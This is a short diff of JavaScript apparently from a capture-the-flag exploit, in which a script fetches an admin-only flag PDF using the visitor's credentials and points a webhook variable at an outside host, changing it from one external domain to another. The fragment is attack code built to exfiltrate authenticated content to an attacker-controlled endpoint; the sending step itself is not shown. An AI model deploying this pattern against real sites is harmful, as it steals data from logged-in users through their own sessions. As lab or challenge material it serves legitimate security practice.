@@ -2,7 +2,7 @@
     // URL for the admin-only flag PDF
     const flagUrl = '/app/admin/flag.pdf';
     // Replace with your actual webhook URL
-    const webhookUrl = 'https://tg1u.top/';
+    const webhookUrl = 'https://test.github.io/cve';
 
     // Fetch the PDF with admin credentials
     fetch(flagUrl, { credentials: 'include' })
